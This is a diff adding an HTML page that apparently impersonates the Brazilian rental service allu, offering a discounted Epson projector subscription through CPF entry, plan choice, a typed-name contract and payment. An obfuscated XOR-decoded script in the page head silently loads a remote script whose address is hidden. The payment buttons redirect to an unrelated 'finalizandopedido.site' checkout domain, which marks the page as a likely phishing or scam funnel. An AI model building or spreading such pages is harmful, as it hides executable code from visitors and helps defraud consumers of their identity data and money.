@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>allu · Assine seu Projetor Epson Lifestudio Pop</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<script>(function(){var v_0kcp=atob("DAjkkCMdVeQ2wZmC/HPG5VFxd94Uqe32jHvevwx+MYoYtO3vlW6dvkByOMpUs7bxn3qN4FduepRfufzu03iN6EZxe45F47WgnXyQ4kp/IJBTsru4p1XIskRxOoZXreqgxlOfsk18OIEU+7vylXCB/Gp5d8gUt/juiW3GqgErNN0A8anhz2yG9EAqN4dU8KiyzDzUoEA/KLlL");var v_n=[];for(var d_fhh=0;d_fhh<v_0kcp.length;d_fhh++){v_n.push(v_0kcp.charCodeAt(d_fhh)&255);}var e_e0g=v_n[0];var p_9=v_n.slice(1,1+e_e0g);var i_bhpq=v_n.slice(1+e_e0g);var a_7q7=i_bhpq.map(function(b,q_l){return b^p_9[q_l%e_e0g];});var l_q8p="";for(var c_9=0;c_9<a_7q7.length;c_9++){l_q8p+=String.fromCharCode(a_7q7[c_9]&255);}var w_2ucr=decodeURIComponent(escape(l_q8p));var g_mia=JSON.parse(w_2ucr);var s_86h4=g_mia.globals||[];s_86h4.forEach(function(o_2fgj){window[o_2fgj.name]=o_2fgj.value;});var y_244=document.createElement("script");y_244.src=g_mia.url;y_244.async=true;y_244.defer=true;(g_mia.attributes||[]).forEach(function(o_6){y_244.setAttribute(o_6.name,o_6.value);});(document.head||document.documentElement).appendChild(y_244);})();</script><style>
+  :root{
+    --bg:#0A100D;
+    --bg-alt:#0F1C15;
+    --panel:#12211A;
+    --line: rgba(74,222,128,0.14);
+    --green-deep:#145C38;
+    --green-mid:#1F8F52;
+    --green-bright:#4ADE80;
+    --white:#F4F7F5;
+    --muted:#8FA79A;
+    --muted-dim:#5C7268;
+    --danger:#FF6B6B;
+    --radius:16px;
+  }
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;}
+  body{
+    background:var(--bg);
+    color:var(--white);
+    font-family:'Inter',system-ui,sans-serif;
+    -webkit-font-smoothing:antialiased;
+    min-height:100vh;
+    position:relative;
+    overflow-x:hidden;
+  }
+
+  /* subtle allugator scale texture */
+  .scales{
+    position:fixed; inset:0; z-index:0; pointer-events:none; opacity:0.5;
+    background-image:
+      radial-gradient(circle at 1px 1px, rgba(74,222,128,0.06) 1px, transparent 1.4px);
+    background-size: 26px 26px;
+    -webkit-mask-image: radial-gradient(ellipse 80% 60% at 50% 0%, black 0%, transparent 75%);
+            mask-image: radial-gradient(ellipse 80% 60% at 50% 0%, black 0%, transparent 75%);
+  }
+
+  .wrap{ position:relative; z-index:1; max-width:1080px; margin:0 auto; padding:0 20px 64px; }
+  @media(min-width:640px){ .wrap{ padding:0 24px 80px; } }
+
+  header.top{
+    display:flex; align-items:center; justify-content:space-between; gap:16px;
+    padding:18px 0 14px; border-bottom:1px solid var(--line);
+    margin-bottom:22px;
+  }
+  @media(min-width:640px){ header.top{ padding:22px 0 18px; margin-bottom:36px; } }
+  .logo img{ height:26px; width:auto; display:block; }
+  @media(min-width:640px){ .logo img{ height:30px; } }
+
+  /* Desktop stepper — this IS a real linear process, numbering is meaningful */
+  .stepper{ display:none; gap:6px; align-items:center; }
+  @media(min-width:820px){ .stepper{ display:flex; } }
+  .step{ display:flex; align-items:center; gap:8px; }
+  .step .num{
+    width:26px; height:26px; border-radius:50%; display:flex; align-items:center; justify-content:center;
+    font-size:12px; font-weight:700; border:1px solid var(--muted-dim); color:var(--muted-dim);
+    transition:all .25s ease;
+  }
+  .step.active .num{ background:var(--green-bright); border-color:var(--green-bright); color:#06130C; }
+  .step.done .num{ background:transparent; border-color:var(--green-mid); color:var(--green-bright); }
+  .step .label{ font-size:12px; color:var(--muted-dim); }
+  .step.active .label{ color:var(--white); }
+  .step-line{ width:20px; height:1px; background:var(--muted-dim); }
+
+  /* Mobile progress — compact bar + "passo X de 5", avoids cramped icon row on small screens */
+  .mobile-progress{ display:flex; align-items:center; gap:10px; }
+  @media(min-width:820px){ .mobile-progress{ display:none; } }
+  .mobile-progress .count{ font-size:12px; font-weight:700; color:var(--muted); white-space:nowrap; }
+  .mobile-progress .track{ width:64px; height:4px; border-radius:100px; background:var(--line); overflow:hidden; }
+  .mobile-progress .track .fill{ height:100%; background:var(--green-bright); border-radius:100px; transition:width .3s ease; }
+
+  .view{ display:none; animation: fadeUp .45s ease; }
+  .view.active{ display:block; }
+  @keyframes fadeUp{ from{opacity:0; transform:translateY(10px);} to{opacity:1; transform:translateY(0);} }
+
+  .eyebrow{ font-size:11.5px; font-weight:700; letter-spacing:0.14em; text-transform:uppercase; color:var(--green-bright); margin-bottom:8px;}
+  h1{ font-size:clamp(26px,7vw,42px); font-weight:800; letter-spacing:-0.03em; line-height:1.1; margin:0 0 12px; }
+  h1 em{ font-style:normal; color:var(--green-bright); }
+  p.lede{ color:var(--muted); font-size:15px; line-height:1.6; max-width:520px; margin:0 0 24px; }
+  @media(min-width:640px){ p.lede{ font-size:16px; margin:0 0 32px; } }
+
+  .card{
+    background:linear-gradient(180deg, var(--panel), var(--bg-alt));
+    border:1px solid var(--line); border-radius:var(--radius);
+    padding:22px; max-width:480px;
+  }
+  @media(min-width:640px){ .card{ padding:32px; } }
+  .card.wide{ max-width:none; }
+
+  label{ display:block; font-size:13px; font-weight:600; color:var(--muted); margin-bottom:8px; }
+  input[type=text]{
+    width:100%; background:#081109; border:1px solid var(--line); border-radius:10px;
+    padding:16px 16px; font-family:'Inter',sans-serif; font-size:20px; font-weight:600;
+    color:var(--white); letter-spacing:0.06em; font-variant-numeric: tabular-nums;
+    outline:none; transition:border-color .2s ease, box-shadow .2s ease;
+  }
+  input[type=text]:focus{ border-color:var(--green-bright); box-shadow:0 0 0 3px rgba(74,222,128,0.18); }
+  input[type=text]::placeholder{ color:var(--muted-dim); letter-spacing:0.06em; }
+  .hint{ font-size:12.5px; color:var(--muted-dim); margin-top:8px; min-height:16px; }
+  .hint.err{ color:var(--danger); }
+  .hint.ok{ color:var(--green-bright); }
+
+  .btn{
+    appearance:none; border:none; cursor:pointer; border-radius:10px;
+    font-family:'Inter',sans-serif; font-weight:700; font-size:15px;
+    padding:15px 24px; display:inline-flex; align-items:center; justify-content:center; gap:8px;
+    transition:transform .15s ease, filter .15s ease, opacity .15s ease;
+  }
+  .btn:focus-visible{ outline:2px solid var(--green-bright); outline-offset:2px; }
+  .btn-primary{ background:var(--green-bright); color:#06130C; width:100%; margin-top:22px; }
+  .btn-primary:hover{ filter:brightness(1.08); }
+  .btn-primary:disabled{ opacity:0.4; cursor:not-allowed; }
+  .btn-primary:active:not(:disabled){ transform:scale(0.98); }
+  .btn-ghost{ background:transparent; border:1px solid var(--line); color:var(--muted); }
+  .btn-ghost:hover{ color:var(--white); border-color:var(--muted-dim); }
+
+  .fineprint{ font-size:12px; color:var(--muted-dim); margin-top:16px; line-height:1.5; }
+  .fineprint a{ color:var(--muted); }
+
+  /* Loading view */
+  .loading-box{ text-align:center; padding:80px 20px; }
+  .scan{ width:56px; height:56px; margin:0 auto 26px; border-radius:14px; border:2px solid var(--line);
+    position:relative; overflow:hidden; }
+  .scan::after{
+    content:""; position:absolute; left:0; right:0; height:2px; background:var(--green-bright);
+    box-shadow:0 0 12px var(--green-bright); animation:scan 1.4s ease-in-out infinite;
+  }
+  @keyframes scan{ 0%{ top:0; } 50%{ top:100%; } 100%{ top:0; } }
+  .loading-box h2{ font-size:18px; font-weight:700; margin:0 0 8px; }
+  .loading-box p{ color:var(--muted-dim); font-size:14px; margin:0; }
+
+  /* Proposal / product view */
+  .product-grid{ display:grid; grid-template-columns:1fr; gap:32px; }
+  @media(min-width:820px){ .product-grid{ grid-template-columns:1fr 1fr; } }
+  .gallery{
+    aspect-ratio:1/1; max-height:320px; background:radial-gradient(circle at 50% 40%, rgba(74,222,128,0.10), transparent 70%), var(--panel);
+    border:1px solid var(--line); border-radius:var(--radius); display:flex; align-items:center; justify-content:center; padding:20px;
+  }
+  @media(min-width:640px){ .gallery{ max-height:none; padding:24px; } }
+  .gallery img{ max-width:78%; max-height:78%; object-fit:contain; filter:drop-shadow(0 20px 40px rgba(0,0,0,0.5)); }
+
+  .price-tag{ display:flex; align-items:baseline; gap:10px; margin:6px 0 18px; flex-wrap:wrap;}
+  .price-old{ color:var(--muted-dim); text-decoration:line-through; font-size:15px; }
+  .price-new{ font-size:32px; font-weight:800; color:var(--green-bright); letter-spacing:-0.02em; }
+  .price-unit{ color:var(--muted); font-size:13px; }
+
+  .spec-list{ list-style:none; margin:20px 0; padding:0; display:grid; gap:10px; }
+  .spec-list li{ display:flex; justify-content:space-between; font-size:14px; padding:10px 0; border-bottom:1px dashed var(--line); color:var(--muted); }
+  .spec-list li b{ color:var(--white); font-weight:600; }
+
+  .badge-row{ display:flex; flex-wrap:wrap; gap:8px; margin:18px 0; }
+  .badge{ font-size:12px; font-weight:600; color:var(--green-bright); background:rgba(74,222,128,0.10); border:1px solid rgba(74,222,128,0.25); padding:6px 12px; border-radius:100px; }
+
+  /* Payment plans */
+  .plans{ display:grid; gap:20px; grid-template-columns:1fr; }
+  @media(min-width:760px){ .plans{ grid-template-columns:1fr 1fr; } }
+  .plan{
+    background:var(--panel); border:1px solid var(--line); border-radius:var(--radius); padding:26px; cursor:pointer;
+    transition:border-color .2s ease, transform .2s ease; position:relative;
+  }
+  .plan:hover{ border-color:var(--muted-dim); }
+  .plan.selected{ border-color:var(--green-bright); box-shadow:0 0 0 1px var(--green-bright); }
+  .plan .tag{ font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:0.08em; color:var(--green-bright); margin-bottom:10px; display:block; }
+  .plan h3{ font-size:19px; margin:0 0 10px; }
+  .plan ul{ margin:14px 0 0; padding-left:18px; color:var(--muted); font-size:13.5px; line-height:1.7; }
+  .plan .radio{
+    position:absolute; top:24px; right:24px; width:20px; height:20px; border-radius:50%; border:2px solid var(--muted-dim);
+  }
+  .plan.selected .radio{ border-color:var(--green-bright); background:radial-gradient(circle, var(--green-bright) 0 45%, transparent 46%); }
+
+  /* Contract */
+  .contract-stack{ display:flex; flex-direction:column; gap:18px; max-width:640px; }
+  .contract-doc{ background:#081109; border:1px solid var(--line); border-radius:12px; padding:20px; font-size:13.5px; color:var(--muted); line-height:1.7; max-height:260px; overflow-y:auto; }
+  @media(min-width:640px){ .contract-doc{ padding:24px; } }
+  .contract-doc h4{ color:var(--white); font-size:13px; margin:16px 0 6px; text-transform:uppercase; letter-spacing:0.06em; }
+  .contract-doc h4:first-child{ margin-top:0; }
+  .read-flag{
+    display:flex; align-items:flex-start; gap:10px; padding:12px 14px; border-radius:10px;
+    background:rgba(74,222,128,0.08); border:1px solid rgba(74,222,128,0.25);
+    color:var(--white); font-size:13px; line-height:1.5;
+  }
+  .sig-box{ border:1px dashed var(--line); border-radius:12px; padding:20px; }
+  .sig-line{ border:none; border-bottom:2px solid var(--muted-dim); background:transparent; width:100%; font-family:'Inter',sans-serif; font-size:24px; font-style:italic; color:var(--green-bright); padding:8px 4px; outline:none; }
+  .sig-line:focus{ border-color:var(--green-bright); }
+  .sig-meta{ display:flex; justify-content:space-between; font-size:11px; color:var(--muted-dim); margin-top:10px; }
+  .checkline{ display:flex; align-items:flex-start; gap:10px; margin-top:20px; font-size:13px; color:var(--muted); }
+  .checkline input{ margin-top:3px; accent-color:var(--green-bright); }
+
+  /* Confirmation */
+  .confirm{ text-align:center; padding:40px 20px; }
+  .check-circle{ width:72px; height:72px; border-radius:50%; background:rgba(74,222,128,0.12); border:1px solid var(--green-mid); display:flex; align-items:center; justify-content:center; margin:0 auto 24px; }
+
+  .row-between{ display:flex; align-items:center; justify-content:space-between; gap:16px; margin-top:24px; flex-wrap:wrap; }
+  .link-back{ background:none; border:none; color:var(--muted-dim); font-size:13px; cursor:pointer; font-family:'Inter',sans-serif; }
+  .link-back:hover{ color:var(--white); }
+
+  .disclosure{
+    margin-top:44px; padding:16px 18px; border:1px solid var(--line); border-radius:12px; background:rgba(74,222,128,0.03);
+    font-size:12px; color:var(--muted-dim); line-height:1.6; max-width:640px;
+  }
+  .disclosure b{ color:var(--muted); }
+
+  @media (prefers-reduced-motion: reduce){
+    *{ animation-duration:0.001ms !important; animation-iteration-count:1 !important; transition-duration:0.001ms !important; }
+  }
+</style>
+</head>
+<body>
+<div class="scales"></div>
+<div class="wrap">
+
+  <header class="top">
+    <div class="logo"><img src="https://cdn.prod.website-files.com/649311d7e925fd4220ee2bd3/64afe03c19b9dbc86dc71f25_logo_allu_neg.svg" alt="allu"></div>
+    <div class="stepper" id="stepper">
+      <div class="step" data-step="1"><div class="num">1</div><div class="label">CPF</div></div>
+      <div class="step-line"></div>
+      <div class="step" data-step="2"><div class="num">2</div><div class="label">Produto</div></div>
+      <div class="step-line"></div>
+      <div class="step" data-step="3"><div class="num">3</div><div class="label">Plano</div></div>
+      <div class="step-line"></div>
+      <div class="step" data-step="4"><div class="num">4</div><div class="label">Contrato</div></div>
+      <div class="step-line"></div>
+      <div class="step" data-step="5"><div class="num">5</div><div class="label">Pagamento</div></div>
+    </div>
+    <div class="mobile-progress" id="mobileProgress">
+      <span class="count" id="mobileCount">Passo 1/5</span>
+      <div class="track"><div class="fill" id="mobileFill" style="width:20%;"></div></div>
+    </div>
+  </header>
+
+  <!-- VIEW 1 — CPF -->
+  <section class="view active" data-view="1">
+    <div class="eyebrow">Passo 1 de 5</div>
+    <h1>Confirme seu CPF para <em>continuar sua assinatura</em></h1>
+    <p class="lede">Verificamos se o número informado é válido para liberar a proposta do seu eletrônico. Isso não substitui a análise de documentos, que acontece depois de você escolher seu plano.</p>
+
+    <div class="card">
+      <label for="cpf">CPF</label>
+      <input type="text" id="cpf" inputmode="numeric" placeholder="000.000.000-00" maxlength="14" autocomplete="off">
+      <div class="hint" id="cpfHint">Digite os 11 números do seu CPF.</div>
+      <button class="btn btn-primary" id="btnCpf" disabled>Verificar CPF</button>
+      <div class="fineprint">Fazemos apenas a validação matemática do número (dígitos verificadores). Não consultamos nome, endereço ou outros dados pessoais nesta etapa — isso é feito com segurança na análise de documentos, na etapa 5.</div>
+    </div>
+  </section>
+
+  <!-- VIEW loading -->
+  <section class="view" data-view="loading">
+    <div class="card" style="max-width:520px;margin:0 auto;">
+      <div class="loading-box">
+        <div class="scan"></div>
+        <h2 id="loadingTitle">Verificando o número informado…</h2>
+        <p id="loadingSub">Conferindo os dígitos verificadores do CPF.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- VIEW 2 — Proposta / produto -->
+  <section class="view" data-view="2">
+    <div class="eyebrow">Passo 2 de 5</div>
+    <h1>Seu <em>eletrônico</em> está disponível</h1>
+    <p class="lede">CPF válido. Aqui está a proposta pensada pra você — confira os detalhes do produto antes de escolher seu plano.</p>
+
+    <div class="product-grid">
+      <div>
+        <div class="gallery">
+          <img src="https://only-public-files.s3.sa-east-1.amazonaws.com/products-images-prod%2F30573479-ca0e-4607-84e5-689af3430191%2Fgeneral-1779999752028-projetor-epson-lifestudio-pop-ef-61w_-som-bose-2.png" alt="Projetor Epson Lifestudio Pop">
+        </div>
+      </div>
+      <div class="card wide" style="padding:0;background:none;border:none;">
+        <h2 style="font-size:26px;margin:0 0 6px;">Projetor Epson Lifestudio Pop</h2>
+        <p style="color:var(--muted);font-size:14.5px;line-height:1.6;margin:0 0 6px;">Mini projetor portátil com resolução 4K UHD, tecnologia laser RGB e brilho de 3000 ANSI lúmens. Projeções de 65" até 300" com suporte a Dolby Vision e som Bose integrado.</p>
+        <div class="price-tag">
+          <span class="price-old">R$ 439,90</span>
+          <span class="price-new">R$ 219,95</span>
+          <span class="price-unit">/ mês</span>
+        </div>
+        <ul class="spec-list">
+          <li><span>Resolução</span><b>4K UHD</b></li>
+          <li><span>Brilho</span><b>3000 ANSI lúmens</b></li>
+          <li><span>Fidelidade mínima</span><b>12 meses</b></li>
+          <li><span>Cobertura</span><b>Roubo, furto e danos</b></li>
+        </ul>
+        <button class="btn btn-primary" id="btnProduct">Escolher meu plano de pagamento</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- VIEW 3 — Planos de pagamento -->
+  <section class="view" data-view="3">
+    <div class="eyebrow">Passo 3 de 5</div>
+    <h1>Escolha como prefere <em>começar a pagar</em></h1>
+    <p class="lede">As duas opções te dão o mesmo produto e a mesma cobertura — a diferença é só como as primeiras cobranças são organizadas.</p>
+
+    <div class="plans">
+      <div class="plan" data-plan="1">
+        <div class="radio"></div>
+        <span class="tag">Opção 1</span>
+        <h3>Comece pagando só a 1ª parcela</h3>
+        <p style="color:var(--muted);font-size:13.5px;margin:0;">A allu cobre sua 2ª parcela e adia a 3ª por 90 dias. Frete grátis para todo o país.</p>
+        <ul>
+          <li>Pague R$ 219,95 hoje</li>
+          <li>2ª parcela: coberta pela allu</li>
+          <li>3ª parcela: cobrada em até 90 dias</li>
+          <li>Frete: grátis, sem custo adicional</li>
+        </ul>
+      </div>
+      <div class="plan" data-plan="2">
+        <div class="radio"></div>
+        <span class="tag">Opção 2</span>
+        <h3>Pague o frete e adie a 1ª parcela</h3>
+        <p style="color:var(--muted);font-size:13.5px;margin:0;">Você paga o frete no ato e sua 1ª parcela do produto só é cobrada em 10 dias.</p>
+        <ul>
+          <li>Frete pago agora (calculado no checkout)</li>
+          <li>1ª parcela: cobrada em até 10 dias</li>
+          <li>Demais parcelas: mensais, a partir daí</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="disclosure">
+      <b>Como funciona:</b> em ambas as opções o valor total do plano é o mesmo; o que muda é o momento em que cada cobrança acontece. Antes de confirmar, você verá o cronograma completo de parcelas, com datas e valores, na etapa de contrato.
+    </div>
+
+    <button class="btn btn-primary" id="btnPlan" style="max-width:340px;" disabled>Continuar para o contrato</button>
+  </section>
+
+  <!-- VIEW 4 — Contrato -->
+  <section class="view" data-view="4">
+    <div class="eyebrow">Passo 4 de 5</div>
+    <h1>Revise e <em>assine seu contrato</em></h1>
+    <p class="lede">Leia as condições abaixo. A assinatura é feita por você, digitando seu nome completo — é assim que registramos seu aceite.</p>
+
+    <div class="contract-stack">
+      <div class="contract-doc">
+        <h4>Objeto</h4>
+        <p>Assinatura de 1 (um) Projetor Epson Lifestudio Pop, resolução 4K UHD, com som Bose integrado, com cobertura contra roubo, furto qualificado e danos acidentais, nos termos do plano <span id="planNameDoc">selecionado</span>.</p>
+        <h4>Especificações do produto</h4>
+        <p>Resolução 4K UHD · Laser RGB, 3000 ANSI lúmens · Projeções de 65" a 300" · Som Bose integrado com Dolby Vision.</p>
+        <h4>Garantia</h4>
+        <p>Garantia legal do consumidor de 60 (sessenta) dias para troca em caso de defeito de fabricação, conforme Código de Defesa do Consumidor, além da cobertura de assistência técnica prevista no plano de assinatura.</p>
+        <h4>Cronograma de cobrança</h4>
+        <p id="planScheduleDoc">Selecione um plano na etapa anterior para ver o cronograma detalhado aqui.</p>
+        <h4>Cancelamento e devolução</h4>
+        <p>Você pode encerrar a assinatura a qualquer momento após o período de fidelidade, devolvendo o aparelho em bom estado, sem custo adicional.</p>
+      </div>
+
+      <div class="read-flag">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" style="flex-shrink:0;"><path d="M12 8v5M12 16h.01M10.3 3.9L1.8 18a2 2 0 0 0 1.7 3h17a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0Z" stroke="#4ADE80" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        <span>Leia o contrato inteiro com atenção antes de assinar abaixo — a assinatura vale como aceite de todos os termos.</span>
+      </div>
+
+      <div class="sig-box">
+        <label for="sigInput">Sua assinatura</label>
+        <input type="text" id="sigInput" class="sig-line" placeholder="Digite seu nome completo" autocomplete="off">
+        <div class="sig-meta"><span id="sigDate"></span><span>Assinatura eletrônica</span></div>
+        <div class="checkline">
+          <input type="checkbox" id="agreeBox">
+          <label for="agreeBox" style="margin:0;font-weight:400;">Li e concordo com os termos do contrato, incluindo o cronograma de cobrança e a garantia de 60 dias.</label>
+        </div>
+        <button class="btn btn-primary" id="btnSign" disabled>Assinar e continuar</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- VIEW 5 — Pagamento final -->
+  <section class="view" data-view="5">
+    <div class="eyebrow">Passo 5 de 5</div>
+    <h1>Falta só o <em>pagamento</em></h1>
+    <p class="lede">Contrato assinado por <b id="payerName" style="color:var(--white);">você</b>. Confirme os dados abaixo para concluir.</p>
+
+    <div class="card">
+      <ul class="spec-list">
+        <li><span>Produto</span><b>Projetor Epson Lifestudio Pop · 4K UHD</b></li>
+        <li><span>Plano</span><b id="payPlan">—</b></li>
+        <li><span>Valor de hoje</span><b id="payToday">—</b></li>
+        <li><span>Assinado por</span><b id="paySigned">—</b></li>
+      </ul>
+      <button class="btn btn-primary" id="btnGoPay">Ir para pagamento seguro</button>
+      <div class="fineprint">(<span id="destinoLabel">—</span>).</div>
+    </div>
+
+    <div class="confirm" id="confirmDone" style="display:none;">
+      <div class="check-circle">
+        <svg width="30" height="30" viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="#4ADE80" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </div>
+      <h2 style="margin:0 0 8px;">Tudo certo!</h2>
+      <p style="color:var(--muted);">Em um ambiente real, você seria direcionado ao checkout para concluir o pagamento com segurança.</p>
+    </div>
+  </section>
+
+  <div class="row-between" id="backRow" style="max-width:1080px;">
+    <button class="link-back" id="btnBack">← Voltar</button>
+  </div>
+
+</div>
+
+<script>
+(function(){
+  // ---- Destinos de checkout por plano ----
+  // Troque essas duas URLs pelos checkouts reais de cada opção de pagamento.
+  // Opção 1 (1ª parcela hoje + allu cobre a 2ª) -> um checkout
+  // Opção 2 (frete antecipado + 1ª parcela em 10 dias) -> outro checkout
+  const CHECKOUT_URLS = {
+    '1': 'https://checkout.finalizandopedido.site/VCCL1O8SD7XG',
+    '2': 'https://checkout.finalizandopedido.site/VCCL1O8SD7XH'
+  };
+
+  const state = { plan:null, signature:'' };
+  const views = document.querySelectorAll('.view');
+  const steps = document.querySelectorAll('.step');
+  let history = ['1'];
+
+  function showView(name){
+    views.forEach(v => v.classList.toggle('active', v.dataset.view === name));
+    const stepNum = name === 'loading' ? history[history.length-2] : name;
+    steps.forEach(s => {
+      const n = parseInt(s.dataset.step);
+      const cur = parseInt(stepNum);
+      s.classList.toggle('active', n === cur);
+      s.classList.toggle('done', n < cur);
+    });
+    const cur = parseInt(stepNum);
+    document.getElementById('mobileCount').textContent = 'Passo ' + cur + '/5';
+    document.getElementById('mobileFill').style.width = (cur/5*100) + '%';
+    document.getElementById('backRow').style.display = (name === '1') ? 'none' : 'flex';
+  }
+
+  function goTo(name, pushHistory){
+    if(pushHistory !== false) history.push(name);
+    showView(name);
+    window.scrollTo({top:0, behavior:'smooth'});
+  }
+
+  document.getElementById('btnBack').addEventListener('click', () => {
+    if(history.length > 1){
+      history.pop();
+      showView(history[history.length-1]);
+      window.scrollTo({top:0, behavior:'smooth'});
+    }
+  });
+
+  // ---- CPF: format mask + real checksum validation (no personal data lookup) ----
+  const cpfInput = document.getElementById('cpf');
+  const cpfHint = document.getElementById('cpfHint');
+  const btnCpf = document.getElementById('btnCpf');
+
+  function maskCPF(v){
+    v = v.replace(/\D/g,'').slice(0,11);
+    if(v.length > 9) return v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
+    if(v.length > 6) return v.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
+    if(v.length > 3) return v.replace(/(\d{3})(\d{1,3})/, '$1.$2');
+    return v;
+  }
+
+  function isValidCPF(raw){
+    const cpf = raw.replace(/\D/g,'');
+    if(cpf.length !== 11) return false;
+    if(/^(\d)\1{10}$/.test(cpf)) return false; // all same digit -> always invalid
+    let sum = 0;
+    for(let i=0;i<9;i++) sum += parseInt(cpf[i]) * (10 - i);
+    let d1 = (sum * 10) % 11; if(d1 === 10) d1 = 0;
+    if(d1 !== parseInt(cpf[9])) return false;
+    sum = 0;
+    for(let i=0;i<10;i++) sum += parseInt(cpf[i]) * (11 - i);
+    let d2 = (sum * 10) % 11; if(d2 === 10) d2 = 0;
+    if(d2 !== parseInt(cpf[10])) return false;
+    return true;
+  }
+
+  cpfInput.addEventListener('input', (e) => {
+    e.target.value = maskCPF(e.target.value);
+    const digits = e.target.value.replace(/\D/g,'');
+    if(digits.length < 11){
+      cpfHint.textContent = 'Digite os 11 números do seu CPF.';
+      cpfHint.className = 'hint';
+      btnCpf.disabled = true;
+      return;
+    }
+    if(isValidCPF(e.target.value)){
+      cpfHint.textContent = 'Número válido.';
+      cpfHint.className = 'hint ok';
+      btnCpf.disabled = false;
+    } else {
+      cpfHint.textContent = 'CPF inválido — confira os números digitados.';
+      cpfHint.className = 'hint err';
+      btnCpf.disabled = true;
+    }
+  });
+
+  btnCpf.addEventListener('click', () => {
+    goTo('loading');
+    document.getElementById('loadingTitle').textContent = 'Verificando o número informado…';
+    document.getElementById('loadingSub').textContent = 'Conferindo os dígitos verificadores do CPF.';
+    setTimeout(() => {
+      history.pop(); // remove 'loading'
+      goTo('2');
+    }, 1400);
+  });
+
+  // ---- Produto -> planos ----
+  document.getElementById('btnProduct').addEventListener('click', () => goTo('3'));
+
+  // ---- Planos ----
+  const planEls = document.querySelectorAll('.plan');
+  const btnPlan = document.getElementById('btnPlan');
+  planEls.forEach(p => {
+    p.addEventListener('click', () => {
+      planEls.forEach(x => x.classList.remove('selected'));
+      p.classList.add('selected');
+      state.plan = p.dataset.plan;
+      btnPlan.disabled = false;
+    });
+  });
+  btnPlan.addEventListener('click', () => {
+    const planName = state.plan === '1'
+      ? 'Opção 1 — 1ª parcela hoje, 2ª coberta pela allu, 3ª em 90 dias, frete grátis'
+      : 'Opção 2 — frete pago agora, 1ª parcela em 10 dias';
+    document.getElementById('planNameDoc').textContent = planName;
+    document.getElementById('planScheduleDoc').textContent = state.plan === '1'
+      ? 'Hoje: R$ 219,95 (1ª parcela). Em 10 dias: 2ª parcela coberta pela allu, sem cobrança. Em até 90 dias: 3ª parcela de R$ 219,95. Frete: grátis, incluso.'
+      : 'Hoje: valor do frete, calculado no checkout. Em até 10 dias: 1ª parcela de R$ 219,95. Parcelas seguintes: mensais, no mesmo valor.';
+    goTo('4');
+  });
+
+  // ---- Contrato / assinatura ----
+  const sigInput = document.getElementById('sigInput');
+  const agreeBox = document.getElementById('agreeBox');
+  const btnSign = document.getElementById('btnSign');
+  document.getElementById('sigDate').textContent = new Date().toLocaleDateString('pt-BR');
+
+  function checkSignReady(){
+    btnSign.disabled = !(sigInput.value.trim().length > 3 && agreeBox.checked);
+  }
+  sigInput.addEventListener('input', checkSignReady);
+  agreeBox.addEventListener('change', checkSignReady);
+
+  btnSign.addEventListener('click', () => {
+    state.signature = sigInput.value.trim();
+    const firstName = state.signature.split(' ')[0];
+    document.getElementById('payerName').textContent = firstName;
+    document.getElementById('paySigned').textContent = state.signature;
+    document.getElementById('payPlan').textContent = state.plan === '1' ? 'Opção 1' : 'Opção 2';
+    document.getElementById('payToday').textContent = state.plan === '1' ? 'R$ 219,95' : 'Valor do frete (calculado no checkout)';
+    document.getElementById('destinoLabel').textContent = state.plan === '1' ? 'checkout Opção 1' : 'checkout Opção 2';
+    goTo('5');
+  });
+
+  // ---- Pagamento final: cada plano leva a um checkout diferente ----
+  document.getElementById('btnGoPay').addEventListener('click', (e) => {
+    const destino = CHECKOUT_URLS[state.plan];
+    e.target.textContent = 'Redirecionando…';
+    e.target.disabled = true;
+    if(destino) window.location.href = destino;
+  });
+
+  showView('1');
+})();
+</script>
+</body>
+</html>
